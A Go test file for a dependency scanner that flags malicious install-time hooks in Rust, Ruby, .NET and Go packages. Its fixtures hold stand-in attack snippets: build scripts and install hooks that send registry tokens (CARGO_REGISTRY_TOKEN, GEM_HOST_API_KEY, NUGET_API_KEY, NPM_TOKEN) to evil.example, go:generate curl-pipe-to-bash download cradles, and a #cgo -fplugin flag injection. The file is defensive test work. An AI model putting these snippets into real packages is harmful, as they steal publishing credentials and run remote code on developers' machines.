package instsurf_test

// Decision D-26 regression corpus.
//
// A real recursive scan of an adversarial fixture set proved that cargo, gem,
// and nuget resolved their dependency trees but never looked at install-time
// code: AnalyzeRust / AnalyzeRuby / AnalyzeDotNet existed but no adapter called
// them. Two planted fixtures (a build.rs exfil and an extconf.rb payload)
// sailed through with zero findings — a false all-clear, the one outcome this
// tool treats as unacceptable.
//
// These tests wire each of the three ecosystems end-to-end (source on disk ->
// ExtractInstallSurface -> VC-002 family) and assert both directions: a
// credential-plus-network hook BLOCKS, and an ordinary build script stays
// silent so the fix does not become a tax on every native package.

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/ecosystem"
	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/gomod"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
)

// runVC002 runs the capability-driven VC-002 family and tallies findings by ID.
func runVC002(g *graph.Graph) map[string]int {
	ctx := &check.Context{Graph: g}
	counts := map[string]int{}
	for _, c := range []check.Check{
		builtin.HookNetwork{},            // VC-002b
		builtin.HookCredentials{},        // VC-002c
		builtin.HookExfilCapable{},       // VC-002d (block)
		builtin.HookObfuscated{},         // VC-002e
		builtin.HookDownloadCradle{},     // VC-002f (block)
		builtin.HookBuildFlagInjection{}, // VC-002h (gate-eligible)
	} {
		for _, f := range c.Run(ctx) {
			counts[f.CheckID]++
		}
	}
	return counts
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// gemRoot / nugetRoot build a one-node rooted graph for an ecosystem whose
// lockfile parser is exercised by its own adapter tests; here we isolate the
// install-surface wiring the new code adds.
func rootedGraph(eco, name, ver string) *graph.Graph {
	g := graph.New()
	id := "pkg:" + eco + "/" + name + "@" + ver
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: eco, Name: name, Version: ver, Depth: 0})
	g.MarkRoot(id)
	return g
}

func TestCargoBuildRsExfilBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Cargo.lock"),
		"[[package]]\nname = \"evil-crate\"\nversion = \"0.1.0\"\n")
	write(t, filepath.Join(dir, "build.rs"), `
use std::env;
fn main() {
    let token = env::var("CARGO_REGISTRY_TOKEN").unwrap();
    let _ = reqwest::blocking::get("https://evil.example/collect").unwrap();
    let _ = token;
}
`)
	g, err := cargo.New().Resolve(dir)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	// The adapter must satisfy the interface — this is the wiring that was missing.
	ex, ok := ecosystem.Adapter(cargo.New()).(ecosystem.InstallSurfaceExtractor)
	if !ok {
		t.Fatal("cargo adapter does not implement InstallSurfaceExtractor")
	}
	if err := ex.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("build.rs reading a registry token and reaching the network must BLOCK (VC-002d); got %v", c)
	}
}

func TestCargoOrdinaryBuildRsSilent(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Cargo.lock"),
		"[[package]]\nname = \"honest-crate\"\nversion = \"0.1.0\"\n")
	write(t, filepath.Join(dir, "build.rs"),
		"fn main() { println!(\"cargo:rustc-link-lib=z\"); }\n")
	g, err := cargo.New().Resolve(dir)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	_ = cargo.New().ExtractInstallSurface(dir, g)
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("an ordinary build.rs must not fire any VC-002 finding; got %v", c)
	}
}

func TestGemExtconfPayloadBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "ext", "evilgem", "extconf.rb"), `
require 'net/http'
key = ENV['GEM_HOST_API_KEY']
Net::HTTP.post(URI('https://evil.example/c'), key)
`)
	g := rootedGraph("gem", "evilgem", "0.1.0")
	if err := rubygems.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("extconf.rb reading GEM_HOST_API_KEY and reaching the network must BLOCK; got %v", c)
	}
}

func TestNuGetInstallPs1Blocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "install.ps1"), `
$key = $env:NUGET_API_KEY
Invoke-WebRequest -Uri "https://evil.example/c" -Body $key
`)
	g := rootedGraph("nuget", "evilpkg", "1.0.0")
	if err := nuget.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("install.ps1 reading NUGET_API_KEY and reaching the network must BLOCK; got %v", c)
	}
}

// --- Go install-surface (OPU-28): //go:generate directives ---

// A go:generate that pipes a download into a shell is a cradle and must BLOCK
// (VC-002f), end-to-end through the gomod adapter.
func TestGoGenerateCradleBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
	write(t, filepath.Join(dir, "gen.go"),
		"package m\n\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002f"] < 1 {
		t.Errorf("a curl|bash go:generate must BLOCK as a download cradle (VC-002f); got %v", c)
	}
}

// A go:generate that curls out a credential is exfil-capable and must BLOCK
// (VC-002d) — the new Go network capability composing into the exfil check.
func TestGoGenerateExfilBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
	write(t, filepath.Join(dir, "gen.go"),
		"package m\n\n//go:generate sh -c \"curl -H \\\"$NPM_TOKEN\\\" https://evil.example/c\"\n")
	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("a go:generate exfiltrating NPM_TOKEN must BLOCK (VC-002d); got %v", c)
	}
}

// An ordinary code-generator directive must stay silent — no network, no exec of
// remote code, so no finding and no graph clutter (the discipline that keeps the
// addition from taxing every Go module that uses go:generate).
func TestGoOrdinaryGenerateSilent(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "go.mod"), "module honest.example/m\n\ngo 1.21\n")
	write(t, filepath.Join(dir, "gen.go"),
		"package m\n\n//go:generate stringer -type=Pill\n//go:generate go run ./internal/gen\n")
	g := rootedGraph("gomod", "honest.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("an ordinary go:generate must fire no VC-002 finding; got %v", c)
	}
}

// Increment 1 scans the ROOT module only: a hostile directive vendored under
// vendor/ is NOT attributed here (that is a later increment), while the root's own
// directive is. This pins the documented scope so a future change that starts
// descending vendor/ is a deliberate, visible one.
func TestGoGenerateVendorSkippedRootScanned(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "go.mod"), "module app.example/m\n\ngo 1.21\n")
	// hostile directive buried in a vendored dependency: out of Increment-1 scope.
	write(t, filepath.Join(dir, "vendor", "evil.example", "dep", "gen.go"),
		"package dep\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
	g := rootedGraph("gomod", "app.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("a vendored go:generate is out of Increment-1 scope and must not fire; got %v", c)
	}

	// The same directive in the root module IS found.
	write(t, filepath.Join(dir, "gen.go"),
		"package m\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
	g2 := rootedGraph("gomod", "app.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g2); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g2); c["VC-002f"] < 1 {
		t.Errorf("a root-module go:generate cradle must BLOCK (VC-002f); got %v", c)
	}
}

// A cgo #cgo directive that loads a compiler plugin arranges code execution at
// `go build` and must fire VC-002h, end-to-end through the gomod adapter; an
// ordinary cgo file stays silent.
func TestGoCgoFlagInjectionFires(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
	write(t, filepath.Join(dir, "bridge.go"),
		"package m\n\n/*\n#cgo CFLAGS: -fplugin=/tmp/evil.so\n*/\nimport \"C\"\n")
	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002h"] < 1 {
		t.Errorf("a #cgo -fplugin directive must fire VC-002h; got %v", c)
	}

	// An ordinary cgo file (the common benign case) stays silent.
	dir2 := t.TempDir()
	write(t, filepath.Join(dir2, "go.mod"), "module honest.example/m\n\ngo 1.21\n")
	write(t, filepath.Join(dir2, "bridge.go"),
		"package m\n\n/*\n#cgo pkg-config: sqlite3\n#cgo LDFLAGS: -lsqlite3\n*/\nimport \"C\"\n")
	g2 := rootedGraph("gomod", "honest.example/m", "v0.0.0")
	if err := gomod.New().ExtractInstallSurface(dir2, g2); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g2); len(c) != 0 {
		t.Errorf("an ordinary cgo file must fire no VC-002 finding; got %v", c)
	}
}
